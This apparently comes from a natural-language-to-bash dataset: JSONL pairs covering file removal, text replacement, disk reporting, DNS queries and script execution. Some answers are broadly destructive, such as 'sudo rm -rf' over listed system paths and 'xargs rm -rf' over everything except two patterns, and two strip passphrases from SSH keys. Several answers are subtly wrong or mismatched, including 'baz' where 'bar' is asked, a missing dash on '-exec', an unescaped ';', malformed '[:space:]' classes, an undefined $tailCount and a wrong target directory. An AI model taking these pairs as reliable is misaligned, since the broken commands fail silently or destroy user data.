{"input": "Remove the \"^M\" characters from all *.ext files under /home directory", "answer": "find /home -type f -name \"*.ext\" -exec sed -i -e \"s/\\r$//g\" {} \\;"}
{"input": "Remove the .jpg files from the current directory whose names match regular expression \".+-[0-9]+x[0-9]+\\.jpg\"", "answer": "find . -type f -regex \".+-[0-9]+x[0-9]+\\.jpg\" -exec rm -rf {} \\;"}
{"input": "Remove the file with inode number 752010", "answer": "find -inum 752010 -exec rm {} \\;"}
{"input": "Remove the files from the home directory tree that were last accessed more than 100 days ago, with confirmation", "answer": "find ~/ -atime +100 -exec rm -i {} ;"}
{"input": "Remove the first 13 characters of each \".txt\" filename in the \"/tmp\" directory tree and number the output", "answer": "find /tmp -type f \\( -name '*.txt' \\) |cut -c14- | nl"}
{"input": "Remove the passphrase from user's ssh key without prompting", "answer": "echo | ssh-keygen -P ''"}
{"input": "Remove the passphrase from ~/.ssh/id_rsa", "answer": "ssh-keygen -f ~/.ssh/id_rsa -P \"\""}
{"input": "Remove the path $1 from the PATH environment variable", "answer": "PATH=$(echo $PATH | tr \":\" \"\\n\" | grep -v $1 | tr \"\\n\" \":\")"}
{"input": "Remove the regular files from the current directory that were last modified on November, 22", "answer": "find -maxdepth 1 -type f -newermt \"Nov 22\" \\! -newermt \"Nov 23\" -delete"}
{"input": "Remove the regular files from the current directory tree that are newer than /tmp/date.start but not newer than /tmp/date.end", "answer": "find ./ -type f -newer /tmp/date.start ! -newer /tmp/date.end -exec rm {} \\;"}
{"input": "Remove the regular files from the current directory tree that were last modified on November, 21", "answer": "find -type f -newermt \"Nov 21\" ! -newermt \"Nov 22\" -delete"}
{"input": "Remove trailing white spaces and replace CRLF with LF in all files under current directory ignoring .git and .svn directories", "answer": "find . -not \\( -name .svn -prune -o -name .git -prune \\) -type f -exec sed -i 's/[:space:]+$//' \\{} \\;  -exec sed -i 's/\\r\\n$/\\n/' \\{} \\;"}
{"input": "Remove trailing white spaces from all *.py files under dir directory (ignoring .git path) and keep backups of the originals", "answer": "find dir -not -path '.git' -iname '*.py' -print0 | xargs -0 sed --in-place=.bak 's/[[:space:]]*$//'."}
{"input": "Remove trailing white spaces from all *.rb files under current directory", "answer": "find . -name '*.rb' | xargs -I{} sed -i '' 's/[[:space:]]*$//g' {}"}
{"input": "Remove trailing white spaces from all *.rb, *.html, *.js, *.coffee, *.css, *.scss, *.erb, *.yml, *.ru files under current directory", "answer": "find . \\( -name *.rb -or -name *.html -or -name *.js -or -name *.coffee -or -name *.css -or -name *.scss -or -name *.erb -or -name *.yml -or -name *.ru \\) -print0 | xargs -0 sed -i '' -E \"s/[[:space:]]*$//\""}
{"input": "Remove trailing white spaces from all files under current directory ignoring .git and .svn directories", "answer": "find . -not \\( -name .svn -prune -o -name .git -prune \\) -type f -exec sed -i \"s/[[:space:]]*$//g\" \"{}\" \\;"}
{"input": "Remove trailing white spaces from all files under current directory ignoring .git, .svn directories and binary files", "answer": "find . -not \\( -name .svn -prune -o -name .git -prune \\) -type f -print0 | xargs -0 file -In | grep -v binary | cut -d \":\" -f1 | xargs -0 sed -i '' -E \"s/[[:space:]]*$//\""}
{"input": "Remove trailing white spaces from all files under current directory ignoring directories wtih *.git* (case insensitive) in their paths and keep backups of the originals", "answer": "find . -type f -not -iwholename '*.git*' -print0  | xargs -0 sed -i .bak -E \"s/[[:space:]]*$//\""}
{"input": "Remove trailing white spaces from all files under dir directory", "answer": "find dir -type f -exec sed -i 's/ *$//' '{}' ';'"}
{"input": "Remove trailing white spaces from all files under dir directory and keep backups of the originals", "answer": "find dir -type f -print0 | xargs -0 sed -i .bak -E \"s/[[:space:]]*$//\""}
{"input": "Remove trailing white spaces from all files under dir directory ensuring white space safety in the filename", "answer": "find dir -type f -print0 | xargs -r0 sed -i 's/ *$//'"}
{"input": "Remove trailing whitespaces from all regular non-hidden files in the current directory tree", "answer": "find . -type f -name '*' -exec sed --in-place 's/[[:space:]]\\+$//' {} \\+"}
{"input": "Remove trailing whitespaces in .txt files from the current directory tree", "answer": "find . -type f -name '*.txt' -exec sed --in-place 's/[[:space:]]\\+$//' {} \\+"}
{"input": "Remove trailing whitespaces in TXT files from the current directory tree", "answer": "find . -iname '*.txt' -type f -exec sed -i '' 's/[[:space:]]\\{1,\\}$//' {} \\+"}
{"input": "Remove what follows the forth occurrence of the character \":\" in any field which contains it", "answer": "sed -r 's/((:[^: \\t]*){3}):[^ \\t]*/\\1/g' file | column -t"}
{"input": "Remove with prompting all files starting in /mydir that have not been accessed in over 100 days", "answer": "find /mydir -atime +100 -ok rm {} \\;"}
{"input": "Remove with prompting all files that have not been accessed in over 100 days", "answer": "find /mydir -atime +100 -ok rm {} \\;"}
{"input": "Removes 'folderName', and removes all content within if 'folderName' is folder", "answer": "rm -rf folderName"}
{"input": "Removes 5 oldest files in the current folder", "answer": "ls -t *.log | tail -$tailCount | xargs rm -f"}
{"input": "Removes 55, adds a 10-digit line number, and rearranges the date for each line in \"input\"", "answer": "nl -nrz -w10 -s\\; input | sed -r 's/55//; s/([0-9]{2})-([0-9]{2})-([0-9]{4})/\\3\\2\\1/'"}
{"input": "Removes 55, adds a 10-digit line number, and rearranges the date for each line in \"input\" on OSX", "answer": "nl -nrz -w10 -s\\; input | sed -E 's/55//; s/([0-9]{2})-([0-9]{2})-([0-9]{4})/\\3\\2\\1/'"}
{"input": "Removes all empty folders that ends with any-cased '*.bak' under '/Users/' path", "answer": "find /Users -type d -iname '*.bak' -print0 | xargs -0 rmdir"}
{"input": "Removes all empty folders under '/path/to/the/folder' path", "answer": "find /path/to/the/folder -depth -type d -print0 | xargs -0 rmdir"}
{"input": "Removes all empty folders under current folder", "answer": "find . -type d -exec rmdir {}\\;"}
{"input": "Removes all empty folders under current path, aged between 'first' and 'last' timestamps", "answer": "find . -newer first -not -newer last -type d -print0 |  xargs -0 rmdir"}
{"input": "Removes all empty folders under path '/foo/bar' and the path itself", "answer": "find /foo/bar -type d -depth -exec rmdir -p {} +"}
{"input": "Removes all empty folders under path '/thepath', printing info message on each operation", "answer": "find /thepath -type d -empty -print0 | xargs -0 rmdir -v"}
{"input": "Removes all empty folders with modification time more that 10 minutes ago from $homeDirData folder", "answer": "find $homeDirData -type d -mmin +10 -print0 | xargs -0 rmdir"}
{"input": "Removes all empty folders within $DELETEDIR folder", "answer": "find \"$DELETEDIR\" -mindepth 1 -depth -type d -empty -exec rmdir \"{}\" \\;"}
{"input": "Removes all files but $1 newest ones from current folder", "answer": "ls -tp | grep -v '/' | tail -n +\"$1\" | xargs -I {} rm -- {}"}
{"input": "Removes all files but 5 newest ones from current folder", "answer": "ls -tp | grep -v '/$' | tail -n +6 | tr '\\n' '\\0' | xargs -0 rm --"}
{"input": "Removes all files from current folder but 3 newest ones", "answer": "ls -tQ | tail -n+4 | xargs rm"}
{"input": "Removes all files from current folder but 5 newest ones, filtering out directories from initial search", "answer": "ls -tp | grep -v '/$' | tail -n +6 | xargs -d '\\n' rm --"}
{"input": "Removes all files from current folder but 5 newest ones, ignoring folders in a files list", "answer": "find . -maxdepth 1 -type f | xargs -x ls -t | awk 'NR>5' | xargs -L1 rm"}
{"input": "Removes all files from current folder but 5 newest ones", "answer": "find . -maxdepth 1 -type f -printf '%T@ %p\\0' | sort -r -z -n | awk 'BEGIN { RS=\"\\0\"; ORS=\"\\0\"; FS=\"\" } NR > 5 { sub(\"^[0-9]*(.[0-9]*)? \", \"\"); print }' | xargs -0 rm -f"}
{"input": "Removes all listed folders with content in sudo mode", "answer": "sudo rm -rf /usr/local/bin/npm /usr/local/share/man/man1/node* /usr/local/lib/dtrace/node.d ~/.npm ~/.node-gyp /opt/local/bin/node opt/local/include/node /opt/local/lib/node_modules"}
{"input": "Removes all top-level *.pdf files in a current folder", "answer": "rm -f *.pdf"}
{"input": "Removes all top-level empty folders within the current folder", "answer": "ls | xargs rmdir"}
{"input": "Removes any empty folder that matches pattern ed*", "answer": "rmdir ed*"}
{"input": "Removes empty folder, and hides error message if one is not empty", "answer": "rmdir --ignore-fail-on-non-empty $newBaseDir/Data/NewDataCopy"}
{"input": "Removes everything from current folder but '*ddl*' and '*docs*' files", "answer": "ls -1|grep -v -e ddl -e docs| xargs rm -rf"}
{"input": "Removes first and last parts of path $path and saves the result in 'finalName' variable", "answer": "finalName=$(basename -- \"$(dirname -- \"$path\")\")"}
{"input": "Removes first and last parts of path 'test/90_2a5/Windows' and prints the result", "answer": "echo 'test/90_2a5/Windows' | xargs dirname | xargs basename"}
{"input": "Removes only lowest level subfolders from current directory tree (folders without files and another folders within)", "answer": "find . -type d | xargs rmdir"}
{"input": "Removes resursively all files and folders named \".DS_Store\"", "answer": "find . -name \".DS_Store\" -print0 | xargs -0 rm -rf"}
{"input": "Removes resursively all files and folders named \"Thumbs.db\", ignoring case distincts", "answer": "find . -iname \"Thumbs.db\" -print0 | xargs -0 rm -rf"}
{"input": "Removes the last 2 lines from a file", "answer": "head -n -2 myfile.txt"}
{"input": "Removes trailing and starting newlines from file", "answer": "tac file | sed -e '/./,$!d' | tac | sed -e '/./,$!d'"}
{"input": "Repeat \"image.png\" 10 times on a single line", "answer": "echo $(yes image.png | head -n10)"}
{"input": "Replace \"  \" with \" $UID \" in the output of \"history\"", "answer": "history | sed \"s/  / $UID /\""}
{"input": "Replace \",\" with \"\\r\\n\" in \"a,b\"", "answer": "echo \"a,b\"|sed 's/,/\\r\\n/'"}
{"input": "Replace \",,\" with \", ,\" in \"$file\" and display the \",\" delimited result as a table in \"less\" with a shift value of 5 and line numbers", "answer": "cat \"$file\" | sed -e 's/,,/, ,/g' | column -s, -t | less -#5 -N -S"}
{"input": "Replace \",,\" with \", ,\" twice in \"data.csv\" and display the \",\" delimited result as a table", "answer": "sed 's/,,/, ,/g;s/,,/, ,/g' data.csv | column -s, -t"}
{"input": "Replace \"-\" with \"0\" in columns 4 and 5 of file \"test.in\" and format as a table", "answer": "awk '{gsub(/-/,\"0\",$4);gsub(/-/,\"0\",$5)}1' test.in | column -t"}
{"input": "Replace \"_\" with newlines in \"Testing\\r\\nTested_Hello_World\" and display the named characters", "answer": "echo -e \"Testing\\r\\nTested_Hello_World\" | awk -v RS=\"_\" '{ print $0; }' | od -a"}
{"input": "Replace \"_\" with newlines in \"Testing\\r_Tested\" and display the named characters", "answer": "echo -e \"Testing\\r_Tested\" | awk -v RS=\"_\" '{ print $0; }' | od -a"}
{"input": "Replace \"dummyvalue\" with the system IP address in \"filename\"", "answer": "sed -i s/'dummyvalue'/$(hostname -I | head -n1 | awk '{print $1;}')/g filename"}
{"input": "Replace \"firstWord\" with \"newFirstWord\", \"secondWord\" with \"newSecondWord\", \"thirdWord\" with \"newThirdWord\" in all XML files in the current directory tree", "answer": "find -name \"*.xml\" -exec sed -s --in-place=.bak -e 's/firstWord/newFirstWord/g;s/secondWord/newSecondWord/g;s/thirdWord/newThirdWord/g' {} \\;"}
{"input": "Replace \"foo\" with \"bar\" in all PHP files in the current directory tree", "answer": "find . -name \"*.php\" -exec sed -i 's/foo/bar/g' {} \\;"}
{"input": "Replace \"foo\" with \"bar\" in all files in the current directory tree", "answer": "find . | xargs sed -i 's/foo/bar/g'"}
{"input": "Replace \"foo\" with \"bar\" in all files in the current directory tree except hidden ones", "answer": "find . -type f -not -name '.*' -print | xargs sed -i 's/foo/bar/g'"}
{"input": "Replace \"inputfile\" with a sorted unique list of its contents", "answer": "sort inputfile | uniq | sort -o inputfile"}
{"input": "Replace \"string1\" with \"string2\" in all regular files in the current directory tree", "answer": "find ./ -type f -exec sed -i 's/string1/string2/g' {} \\;"}
{"input": "Replace \"version.old\" with \"version.new\" in the symbolic link target of \"SomeLibrary\"", "answer": "ln -f -s -T `readlink SomeLibrary | sed 's/version.old/version.new/'` SomeLibrary"}
{"input": "Replace 'company' with 'newcompany' in all files under current directory and keep backups with .bakup extension", "answer": "find -type f -print0 | xargs -0 sed -i .bakup 's/company/newcompany/g'"}
{"input": "Replace all '\u7f6e\u63db\u524d' with '\u7f6e\u63db\u5f8c' in all regular files under current directory tree and modify them in-place", "answer": "sudo find . -type f -exec sed -i 's/\u7f6e\u63db\u524d/\u7f6e\u63db\u5f8c/g' {} \\;"}
{"input": "Replace all URLs in \"MyHTMLFile.html\" with \"$pub_url\" and create a backup with suffix \".bak\"", "answer": "sed -i.bak \"s#https.*\\.com#$pub_url#g\" MyHTMLFile.html"}
{"input": "Replace all colons (':') with newlines in $list and search for the first match to the regex \"^$removepat\\$\" where $removepat is a variable and save the result to variable 'removestr'", "answer": "removestr=$(echo \"$list\" | tr \":\" \"\\n\" | grep -m 1 \"^$removepat\\$\")"}
{"input": "Replace all instances of \";\" with \"\\n\" in \"bla@some.com;john@home.com\"", "answer": "echo \"bla@some.com;john@home.com\" | sed -e 's/;/\\n/g'"}
{"input": "Replace all instances of \"STRING_TO_REPLACE\" with \"REPLACE_WITH\" in file \"index.html\" and make a backup with suffix \"bak\"", "answer": "sed -ibak -e s/STRING_TO_REPLACE/REPLACE_WITH/g index.html"}
{"input": "Replace all instances of \"STRING_TO_REPLACE\" with \"STRING_TO_REPLACE_IT\" in file \"index.html\" and make a backup with suffix \"bak\" on OSX", "answer": "sed -i bak -e s/STRING_TO_REPLACE/REPLACE_WITH/g index.html"}
{"input": "Replace all instances of \"string\" with \"longer_string\" in file \"input.txt\" and re-align", "answer": "cat input.txt | sed 's/string/longer_string/g' | column -t"}
{"input": "Replace all matches with the regex expanded by $P_FROM with the text expanded by $P_TO in all regular files under current directory not going into subdirectories and modify the files in-place", "answer": "find . -type f -maxdepth 1 -exec sed -i \"s/$P_FROM/$P_TO/g\" {} \\;"}
{"input": "Replace all negative numbers in the 3rd comma-separated column of inputfile by the number notated in parenthesis instead of with a minus sign", "answer": "awk -F, 'BEGIN {OFS = \",\"} {gsub(\"-([0-9.]+)\", \"(\" substr($3, 2) \")\", $3); print}' inputfile"}
{"input": "Replace all newlines except the last with a comma in \"test.txt\"", "answer": "sed -i ':a;N;$!ba;s/\\n/,/g' test.txt"}
{"input": "Replace all newlines with spaces in the contents of \"file\"", "answer": "sed -e '{:q;N;s/\\n/ /g;t q}' file"}
{"input": "Replace all non-punctuation characters with newlines from standard input", "answer": "tr -sc '[:punct:]' '\\n'"}
{"input": "Replace all occurrence of \"log_errors = Off\" with \"log_errors = On\" in all 'php.ini' files in the current directory tree", "answer": "find . -name 'php.ini' -exec sed -i 's/log_errors = Off/log_errors = On/g' \"{}\" \\;"}
{"input": "Replace all occurrence of \"subdomainA.example.com\" with \"subdomainB.example.com\" in all files under /home/www and below", "answer": "find /home/www -type f -print0 | xargs -0 sed -i 's/subdomainA.example.com/subdomainB.example.com/g'"}
{"input": "Replace all occurrence of \"subdomainA.example.com\" with \"subdomainB.example.com\" in all files under the current directory and below ignoring SVN files", "answer": "find . \\( ! -regex '.*/\\..*' \\) -type f -print0 | xargs -0 sed -i 's/subdomainA.example.com/subdomainB.example.com/g'"}
{"input": "Replace all occurrences of \"StringA\" with \"StringB\" in the *.php and *.html files residing in the current directory tree", "answer": "find . \\( -name \"*.php\" -or -name \"*.html\" \\) | xargs grep -l StringA | xargs sed -i -e 's/StringA/StringB/g'"}
{"input": "Replace all occurrences of \"foo_fn\" with \"bar_fn\" in the files named \"foo_fn\" from the current directory tree", "answer": "find . -name foo_fn exec sed -i s/foo_fn/bar_fn/g '{}' \\;"}
{"input": "Replace all occurrences of '2013 Magento Inc.' with '2012 Magento Inc.' in all files with '.php, '.xml' and '.phtml' extensions under current directory tree", "answer": "find . -name '*.php' -print0 -o -name '*.xml' -print0 -o -name '*.phtml' -print0 | xargs -0 sed -i '' 's/2013 Magento Inc./2012 Magento Inc./g'"}
{"input": "Replace all occurrences of 'previousword' with 'newword' in all regular files with '.cpp' extension under '/home/www' directory tree and modify them in-place", "answer": "find /home/www -type f -name '*.cpp'  -exec sed -i 's/previousword/newword/g' '{}' \\;"}
{"input": "Replace all occurrences of 'previousword' with 'newword' in all regular files with '.cpp' extension under '/myprojects' directory tree and modify them in-place", "answer": "find /myprojects -type f -name '*.cpp' -print0 | xargs -0 -n 1 sed -i 's/previousword/newword/g'"}
{"input": "Replace all occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in all regular files under '/home/www' directory tree", "answer": "find /home/www -type f -print0 | xargs -0 sed -i 's/subdomainA.example.com/subdomainB.example.com/g'"}
{"input": "Replace all occurrences of edx (case insensitive) with gurukul in all *.css (case insensitive) files under ./cms/djangoapps/contentstore/management/commands/tests directory", "answer": "find ./cms/djangoapps/contentstore/management/commands/tests -iname *.css | xargs sed -i s/[Ee][Dd][Xx]/gurukul/g"}
{"input": "Replace all occurrences of edx (case insensitive) with gurukul in all *.css (case insensitive) files under ./cms/djangoapps/contentstore/views directory", "answer": "find ./cms/djangoapps/contentstore/views -iname *.css | xargs sed -i s/[Ee][Dd][Xx]/gurukul/g"}
{"input": "Replace all occurrences of foo (case insensitive) with bar in all *.css (case insensitive) files under %s directory", "answer": "find %s -iname *.css | xargs sed -i s/[Ff][Oo][Oo]/bar/g"}
{"input": "Replace all occurrences of word \"foo\" with \"bar\" in *.c and *.h files from the current directory tree", "answer": "find -name '*.[ch]' -exec sed -i 's/\\<foo\\>/bar/g' {} +"}
{"input": "Replace all ocurrences of '<title>' with 'sblmtitle\\n<title>' in all the regular files with '.html' extension under current directory tree", "answer": "find ./ -type f -name '*.html' | xargs sed -i 's/<title>/sblmtitle\\n<title>/g'"}
{"input": "Replace all sequence of 'blank' characters in file 'log' with a single occurence of such symbol and print space-separated fields of each string but first two fields", "answer": "cat log | tr -s [:blank:] |cut -d' ' -f 3-"}
{"input": "Replace all spaces (' ') with comma (',') in ${TO_IGNORE[@]}, append with '--ignore ' and save the resultant string to variable 'ARGS'", "answer": "ARGS=\"--ignore `echo ${TO_IGNORE[@]} | tr ' ' ','`\""}
{"input": "Replace all spaces with underscores in directory names under current directory", "answer": "find /tmp/ -depth -name \"* *\" -execdir rename 's/ /_/g' \"{}\" \\;"}
{"input": "Replace all spaces with underscores in directory paths under current directory", "answer": "find -name \"* *\" -type d | rename 's/ /_/g'"}
{"input": "Replace all spaces with underscores in file paths under current directory", "answer": "find -name \"* *\" -type f | rename 's/ /_/g'"}
{"input": "Replace all the mathes to regex '<script type=\"text\\/javascript\" charset=\"utf-8\" src=\"file.js\"><\\/script>.*' with '<script type=\"text\\/javascript\" charset=\"utf-8\" src=\"file2.js\"><\\/script>' in all HTML files under $DIR directory tree modifying the files in-place", "answer": "find $DIR -type f -name '*.html' -exec sed -i 's/.*<script type=\"text\\/javascript\" charset=\"utf-8\" src=\"file.js\"><\\/script>.*/<script type=\"text\\/javascript\" charset=\"utf-8\" src=\"file2.js\"><\\/script>/g' {} \\;"}
{"input": "Replace any sequence of spaces in file 'text.txt' with single space and print 4th space separated field", "answer": "cat text.txt | tr -s ' ' | cut -d ' ' -f 4"}
{"input": "Replace commas (',') with newlines in $MOUNT_OPTS and search for the regex '^acl$'", "answer": "echo $MOUNT_OPTS | tr , \\\\\\n | grep '^acl$' -q"}
{"input": "Replace each new line in \"INPUT.txt\" with \":\"", "answer": "paste -sd: INPUT.txt"}
{"input": "Replace each newline in input \"1\\n2\\n3\\n4\\n5\" with a comma", "answer": "echo \"1\\n2\\n3\\n4\\n5\" | paste -s -d, /dev/stdin"}
{"input": "Replace each non-blank line in \"YOURFILE\" preceded with \"pX=\" where \"X\" is the line number", "answer": "grep -v '^$' YOURFILE | nl -s= -w99 | tr -s ' ' p"}
{"input": "Replace newline with \"_\" in \"file\" then search for \"_foo_\" and output with \"_\" characters deleted", "answer": "grep -o \"_foo_\" <(paste -sd_ file) | tr -d '_'"}
{"input": "Replace spaces in directory names with underscores for all directories in the current directory tree", "answer": "find -name \"* *\" -type d | rename 's/ /_/g'"}
{"input": "Replace spaces in file names with underscores for all files in the current directory tree", "answer": "find -name \"* *\" -type f | rename 's/ /_/g'"}
{"input": "Replace spaces with underscores in the names of all files and directories in the \"/tmp\" directory tree", "answer": "find /tmp/ -depth -name \"* *\" -execdir rename \" \" \"_\" \"{}\" \";\""}
{"input": "Replace the \"openssl\" command executable with a symbolic link to \"/usr/local/ssl/bin/openssl\"", "answer": "sudo ln -sf /usr/local/ssl/bin/openssl `which openssl`"}
{"input": "Replace the first occurrence of \"foo\" with \"bar\" on every line in .txt files from the current directory tree", "answer": "find . -type f -name '*.txt' | xargs --replace=FILE sed --in-place 's/foo/baz/' FILE"}
{"input": "Replace the first occurrence of \"string1\" on each line with \"string2\" in all regular files in the current directory tree", "answer": "find ./ -type f -exec sed -i 's/string1/string2/' {} \\;"}
{"input": "Replace the leading spaces in the output of \"history\" with periods", "answer": "history | sed 's/^ */&\\n/; :a; s/ \\(.*\\n\\)/.\\1/; ta; s/\\n//'"}
{"input": "Replace the occurrences of \"HOGE\" with \"MOGA\" once per each line of the .yaml files from the current directory tree", "answer": "find . -type f -name \"*.yaml\" -print0 | xargs -0 sed -i -e \"s/HOGE/MOGA/\""}
{"input": "Replace the occurrences of \"HOGE\" with \"MOGA\" once per each line of the files from the current directory tree, keeping a backup copy of every touched file", "answer": "find . -type f -print0 | xargs -0 sed -i.bak -e \"s/HOGE/MOGA/\""}
{"input": "Replace the spaces after line number in the output of history with \"..\"", "answer": "history | sed 's/^\\( *[0-9]*\\) */\\1../'"}
{"input": "Replaces any occurences of '*favicon.ico*' in any subfolder with file '/root/favicon.ico'", "answer": "find . | grep favicon\\.ico | xargs -n 1 cp -f /root/favicon.ico"}
{"input": "Report all C language source code files under the current directory", "answer": "find . -name \\*.c -print"}
{"input": "Report all files in /mydir1 and /mydir2 larger than 2000 blocks and accessed in over 30 days", "answer": "find /mydir1 /mydir2 -size +2000 -atime +30 -print"}
{"input": "Report all files starting in the directories /mydir1 and /mydir2 larger than 2,000 blocks that have not been accessed in over 30 days", "answer": "find /mydir1 /mydir2 -size +2000 -atime +30 -print"}
{"input": "Report available space on the file system containing /tmp in kilobytes", "answer": "df -k /tmp | tail -1 | awk '{print $4}'"}
{"input": "Report file system '/dev/disk0s2' disk usage", "answer": "df | grep /dev/disk0s2"}
{"input": "Report file system containing path to /dir/inner_dir/ disk usage in kilobytes", "answer": "df -k /dir/inner_dir/"}
{"input": "Report file system containing path to the current working directory inodes usage", "answer": "df -i $PWD"}
{"input": "Report file system mounted at $path_in_question disk usage if canonical path $path_in_question is a mount point", "answer": "df $path_in_question | grep \" $path_in_question$\""}
{"input": "Report file systems disk usage human-readable using POSIX output format", "answer": "df -Ph"}
{"input": "Report file systems disk usage in 1GB blocks", "answer": "df -BG"}
{"input": "Report file systems disk usage, elide all entries insignificant to available space, and produce a grand total", "answer": "df --total"}
{"input": "Report only total size of file systems in 1T blocks", "answer": "df --total -BT | tail -n 1 | sed -E 's/total *([^ ]*).*/\\1/'"}
{"input": "Report only total size of file systems in terabytes", "answer": "df -m | awk '{ SUM += $2} END { print SUM/1024/1024\"TB\" }'"}
{"input": "Report total disk usage info on root file system, printing all sizes as power of 1000", "answer": "df -H --total /"}
{"input": "Report total file systems disk usage estimated in terabytes", "answer": "df --total -BT | tail -n 1"}
{"input": "Report total file systems disk usage in 1T blocks", "answer": "df --total -BT | tail -n 1"}
{"input": "Report total file systems disk usage", "answer": "df --total | tail -n 1"}
{"input": "Report total size of the root filesystem disk usage in powers of 1000", "answer": "df -H --total /"}
{"input": "Reports count of characters in the value of ${FOO_NO_EXTERNAL_SPACE} variable as follows:  \"length(FOO_NO_EXTERNAL_SPACE)==<counted number of characters>\"", "answer": "echo -e \"length(FOO_NO_EXTERNAL_SPACE)==$(echo -ne \"${FOO_NO_EXTERNAL_SPACE}\" | wc -m)\""}
{"input": "Reports count of characters in the value of ${FOO_NO_TRAIL_SPACE} variable as follows: \"length(FOO_NO_TRAIL_SPACE)==<counted number of characters>\"", "answer": "echo -e \"length(FOO_NO_TRAIL_SPACE)==$(echo -ne \"${FOO_NO_TRAIL_SPACE}\" | wc -m)\""}
{"input": "Reports count of characters in the value of ${FOO_NO_WHITESPACE} variable as follows: \"length(FOO_NO_WHITESPACE)==<counted number of characters>\"", "answer": "echo -e \"length(FOO_NO_WHITESPACE)==$(echo -ne \"${FOO_NO_WHITESPACE}\" | wc -m)\""}
{"input": "Reports count of processors in system", "answer": "grep \"^core id\" /proc/cpuinfo | sort -u | wc -l"}
{"input": "Represent current date in RFC 3339 format with precision to seconds and save it to 'timestamp' variable", "answer": "timestamp=`date --rfc-3339=seconds`"}
{"input": "Represent the UTC date given in time string \"1970.01.01-$string1\" as number of seconds since the epoch and save it in 't1' variable", "answer": "t1=$(date -u -d \"1970.01.01-$string1\" +\"%s\")"}
{"input": "Request A record from nameserver $ns for domain name $d, filter strings with domain name and exclude lines matching 'DIG'", "answer": "dig @$ns $d A | grep $d | grep -v \"DiG\""}
{"input": "Request DNS record for  domain 'dragon-architect.com' with tracing and additional section, and extract third block of text, separated between two new lines", "answer": "dig +trace +additional dragon-architect.com | awk 'NR==3' RS=\"\\n\\n\""}
{"input": "Request IP address for each domain name received on the command input", "answer": "dig +short -f - | uniq"}
{"input": "Request IP address of 'myip.opendns.com' from name server 'resolver1.opendns.com'", "answer": "dig +short myip.opendns.com @resolver1.opendns.com"}
{"input": "Request MX record of 'example.com' domain, and filter out all comment strings", "answer": "dig mx example.com | grep -v '^;' | grep example.com"}
{"input": "Request NS record for com. domain, receiving only authoritative answers", "answer": "dig NS +aaonly com."}
{"input": "Request authority info with comments for 'djzah.com' from name server 'ns1.hosangit.com', and pass it to 'script.awk' awk script", "answer": "dig @ns1.hosangit.com djzah.com +noall +authority +comments | awk -f script.awk"}
{"input": "Request changing the passphrase of key file \"private.key\"", "answer": "ssh-keygen -pf private.key"}
{"input": "Request that the master ssh connection \"officefirewall\" exits", "answer": "ssh -O exit officefirewall"}
{"input": "Resolve all symlinks in path to \"firefox\" binary if it exists in path, resulting in absolute path with no symlinks", "answer": "readlink -f $(which firefox)"}
{"input": "Resolve any symlinks in working directory, and go to resulting pathname", "answer": "cd \"`pwd -P`\""}
{"input": "Resolve symbolic link of file \"/foo/bar/baz\"", "answer": "readlink -e /foo/bar/baz"}
{"input": "Resolve symbolic link of file \"FILE\" even if the file does not exist", "answer": "readlink -m FILE"}
{"input": "Resolve symbolic link of path of \"python2.7\"", "answer": "readlink $(which python2.7)"}
{"input": "Retrieve column number from column name \"Target\" in file \"table\"", "answer": "head -1 table | tr -s ' ' '\\n' | nl -nln |  grep \"Target\" | cut -f1"}
{"input": "Return 0 if at least one \"abc\" file in the current directory tree contains text \"xyz\"", "answer": "find . -name 'abc' -type f -exec grep -q xyz {} +"}
{"input": "Return all of the .conf files in Pat's user folder and subdirectories", "answer": "find /home/pat -iname \"*.conf\""}
{"input": "Return the depth of the current directory tree", "answer": "find . -type d -printf '%d:%p\\n' | sort -n | tail -1"}
{"input": "Return the files that are newer than file `myfile'", "answer": "find / -newer myfile"}
{"input": "Return the list of files named \"filename\" that are 50 megabytes or larger", "answer": "find / -size +50M -iname \"filename\""}
{"input": "Returns 0 if user $1 belongs to group $2", "answer": "groups $1 | grep -q \"\\b$2\\b\""}
{"input": "Returns exit code 1 and terminates shell if 'set -e' was applied", "answer": "a=$(false)"}
{"input": "Returns exit code 1", "answer": "a=$(false)"}
{"input": "Returns exit status 0 and prints exit status of previous command", "answer": "false | echo \"${PIPESTATUS[0]}\""}
{"input": "Returns the single most recent file in a directory", "answer": "ls -t | head -n1"}
{"input": "Returns unsuccessful exit code on each found file like '*tests*' within current directory", "answer": "find . -name '*tests*' -print -exec false \\;"}
{"input": "Reverse the order of lines in \"dax-weekly.csv\" keeping the first line the same", "answer": "cat dax-weekly.csv | awk '1 { last = NR; line[last] = $0; } END { print line[1]; for (i = last; i > 1; i--) { print line[i]; } }'"}
{"input": "Reverse the space separated words in \"35 53 102 342\"", "answer": "echo 35 53 102 342|tr ' ' '\\n'|tac|tr '\\n' ' '"}
{"input": "Reverse the space separated words in \"aaaa eeee bbbb ffff cccc\"", "answer": "echo \"aaaa eeee bbbb ffff cccc\"|tr ' ' '\\n'|tac|tr '\\n' ' '"}
{"input": "Reverse the text in $input by taking each 4 characters as each units and save the result in variable 'output'", "answer": "output=$(echo $input | fold -w4 | tac | tr -d \\\\n)"}
{"input": "Reversibly sorts content of the '${TMP}/${SCRIPT_NAME}.kb' file, comparing human readable numbers in file strings", "answer": "cat ${TMP}/${SCRIPT_NAME}.kb|sort -rh;"}
{"input": "Reversibly sorts content of the '${TMP}/${SCRIPT_NAME}.name' file", "answer": "cat ${TMP}/${SCRIPT_NAME}.name|sort -r;"}
{"input": "Reversibly sorts content of the '${TMP}/${SCRIPT_NAME}.pid' file, comparing human readable numbers in file strings", "answer": "cat ${TMP}/${SCRIPT_NAME}.pid|sort -rh;"}
{"input": "Revert $string value and print first 20 space-separated fields", "answer": "echo $string | rev | cut -d ' ' -f -20"}
{"input": "Rotates the dirs stack so that the second directory (counting from the right of the list shown by `dirs', starting with zero) is at the top", "answer": "pushd -2"}
{"input": "Run \"command\" on server \"host\" as user \"user\"", "answer": "echo \"command\" | ssh user@host"}
{"input": "Run 'otherscript.sh' script with all environment variables specified in the file 'xxxx'", "answer": "env `cat xxxx` otherscript.sh"}
{"input": "Run 'top' in batch mode (don't accept user input) with delay of 1 second between updates, and duplicate the standard output to file 'output.log' in current directory", "answer": "top -b -d 1 | grep myprocess.exe | tee output.log"}
{"input": "Run .makeall.sh in an empty environment", "answer": "env -i ./makeall.sh"}
{"input": "Run a \"rm\" process to recursively remove \"cache\", making it immune to all SIGHUP signals sent to it", "answer": "nohup rm -rf cache &"}
{"input": "Run a shell with all environment variables specified in the file 'cronenv' in the user's home directory", "answer": "env - `cat ~/cronenv` /bin/sh"}
